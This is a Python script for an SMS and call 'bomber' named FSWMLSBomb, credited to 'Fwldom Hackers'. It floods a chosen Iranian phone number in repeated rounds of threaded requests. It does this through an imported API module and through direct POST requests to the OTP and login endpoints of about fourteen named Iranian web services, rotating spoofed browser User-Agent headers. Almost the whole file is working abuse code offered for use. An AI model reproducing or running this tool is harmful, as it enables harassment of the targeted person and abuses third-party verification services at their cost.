from threading import Thread
from Api import sms, call
from time import sleep
from inspect import getmembers, isfunction 
from os import system, name
from colorama import * 
import random
import requests
#Start
system("cls" or "clear")
print("Starting FSWMLSBomb ... ")
sleep(2)
system("cls" or "clear")
print("Loading ..")
sleep(0.5)
system("cls" or "clear")
print("Loading ...")
sleep(0.5)
system("cls" or "clear")
print("Loading .")
sleep(0.5)
system("cls" or "clear")
print("Loading ..")
sleep(0.5)
system("cls" or "clear")
print("Loading ...")
sleep(0.5)
system("cls" or "clear")
print("Loading ..")
sleep(0.5)
system("cls" or "clear")
print("Loading ...")
sleep(0.5)


system("cls" or "clear")
print("***********")
sleep(0.2)
system("cls" or "clear")
print("F**********")
sleep(0.2)
system("cls" or "clear")
print("FW*********")
sleep(0.2)
system("cls" or "clear")
print("FWL********")
sleep(0.2)
system("cls" or "clear")
print("FWLD*******")
sleep(0.2)
system("cls" or "clear")
print("FWLDOM*****")
sleep(0.2)
system("cls" or "clear")
print("FWLDOM_****")
sleep(0.2)
system("cls" or "clear")
print("FWLDOM_B***")
sleep(0.2)
system("cls" or "clear")
print("FWLDOM_BO**")
sleep(0.2)
system("cls" or "clear")
print("FWLDOM_BOM*")
sleep(0.2)
system("cls" or "clear")
print("FWLDOM_BOMB")
sleep(0.2)
system("cls" or "clear")
print("FWLDOM_BOMB")
sleep(0.5)
system("cls" or "clear")
print("FWLDOM_BOMB")
sleep(0.5)
system("cls" or "clear")
print("FWLDOM_BOMB")
sleep(0.5)
system("cls" or "clear")
print(Fore.BLUE +" ██████  ██    ██    ██   ██           ████████        █████       ████████████")
print(           " ██  f   ██    ██    ██   ██          ██      ██      █     █      ██   ██   ██")
print(           " ██████  ██    ██ w  ██   ██  L       ██   D    ██   █    O  █     ██ M ██   ██")
print(           " ██      ██    ██    ██   ██          ██       ██     █     █      ██   ██   ██")
print(           " ██      ██    ██    ██   ██          ██     ██        █████       ██   ██   ██")
print(           " ██       ███████████     ███████      ███████ \n" + Fore.RESET)
print(Fore.CYAN +  " Name App : FSWMLSBOMB ; | App Version : 1.00.00 ; | More : 100 Api .")
print(Fore.GREEN + " Fwldom Hackers . For Woman Life Freedom . Are You Ready ?" + Fore.BLACK)
print(Fore.LIGHTYELLOW_EX +   " WebSite : www.fwldom.rf.gd , GitHub : fwldom , Telegram : @Fwldom1")

SMS_SERVICES = list(i[0] for i in getmembers(sms, isfunction))
CALL_SERVICES = list(i[0] for i in getmembers(call, isfunction))


def bombing(phone, count):
     x = 0
     phone = f"+98{phone[1:]}"
     for j in range(count):

        for k in range(len(SMS_SERVICES)):
            Thread(target=getattr(sms, SMS_SERVICES[k]), args=[phone]).start()
        if (j !=0) and (j % 5) == 0:
            Thread(target=getattr(call, CALL_SERVICES[x]), args=[phone]).start()
            x += 1
            if x > len(CALL_SERVICES) - 1:
            	x = 0
        print(f"Round {j+1} Completed XD")
        sleep(0.2)
     print("Finish")
    
def bombing2():
    #Data
     url_basalam = "https://auth.basalam.com/otp-request"
     json_basalam ={"mobile" : "0" +number}

     url_divar= "https://api.divar.ir/v5/auth/authenticate"
     json_divar= {"phone":number}

     url_snapp= "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
     json_snapp= {"cellphone":"+98" + number}

     url_sf= "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=4a2dcc5a-4b65-4b72-a3ab-c6cdcc6e1737&locale=fa"
     json_sf= {"cellphone":"0" + number}

     url_sh= "https://www.sheypoor.com/api/v10.0.0/auth/send"
     json_sh= {"username":"0" + number}

     url_alibaba= "https://ws.alibaba.ir/api/v3/account/mobile/otp"
     json_alibaba= {"phoneNumber":"+98" + number}

     url_cinma= "https://cinematicket.org/api/v1/users/signup"
     json_cinma= {"phone_number":"98" + number}

     url_digikala= "https://api.digikala.com/v1/user/authenticate/"
     json_digikala= {"backUrl":"/","username":"0" + number}

     url_jet= "https://api.digikalajet.ir/user/login-register/"
     json_jet= {"phone":"0" + number}

     url_virgool= "https://virgool.io/api/v1.4/auth/verify"
     json_virgool= {"method":"phone","identifier":"+98" + number}

     url_aparat= "https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1?callbackType=postmessage"
     json_aparat= {"temp_id":"474674","account":"0","codepass_type":"otp","guid":"3433103F-9DE0-6E66-5829-B02DFE66EEF0" + number}

     url_telewebion= "https://auth.telewebion.com/user/authenticate"
     json_telewebion= {"field":"+98","type":"mobile" + number}

     url_sb= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
     json_sb= {"phoneNumber":"0" + number}

     url_tpsi= "https://api.tapsi.cab/api/v2/user"
     json_tpsi= {"credential":{"phoneNumber":"0","role":"PASSENGER" + number}}
#end url
#heads
     heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]

#end heads
#sent
     k=0
     while range(yy):
         
         random_head = random.choice(heads)
         requests.post(url=url_divar,json=json_divar,headers=random_head)

         requests.post(url= url_snapp,json=json_snapp,headers=random_head)

         requests.post(url= url_sf,json=json_sf,headers=random_head)

         requests.post(url= url_sh,json=json_sh,headers=random_head) 

         requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)

         requests.post(url= url_cinma,json=json_cinma,headers=random_head)

         requests.post(url= url_digikala,json=json_digikala,headers=random_head)

         requests.post(url= url_jet,json=json_jet,headers=random_head)

         requests.post(url= url_virgool,json=json_virgool,headers=random_head)

         requests.post(url= url_aparat,json=json_aparat,headers=random_head)

         requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)

         requests.post(url= url_sb,json=json_sb,headers=random_head)

         requests.post(url= url_tpsi,json=json_tpsi,headers=random_head)

         requests.post(url=url_basalam ,json=json_basalam,headers=random_head)   
         print(f"Round {k+1} Complte SMS XD ")
     return True


if __name__ == "__main__":
    num = input( Fore.BLUE +'''***Enter your Number phone [-98:]
[number:0999*******]---> : '''+ Fore.RESET)
    yy = int(input(Fore.LIGHTGREEN_EX+"#*#Enter The Count of Round of Bombing .1 = almost 94 Sms ##>> "))
    system('clear' if name == 'posix' else 'cls')
    print("*Phone Number:{}\n*Rounds: {}\n\n".format(num,yy))
    print("Starting Bombing 1 ...\n")
    bombing(phone=num,count=yy)
    number= num[1:11]
    sleep(3)
    system("cls" or "clear")
    print("Starting Bombing 2 ...\n")
    sleep(1)
    system("cls" or "clear")
    print("*//>Number Phone : " + num)
    print("*//>Round : "+ str(yy))
    while range(yy):
         bombing2()
         print("Complte Sms Bomb .... ")
         print("Made By Fwldom")
         print("GitHub : https://github.com/fwldom , Telegram : @Fwldom1 , WebSite : www.fwldom.rf.gd")
         print("Exiting ...")


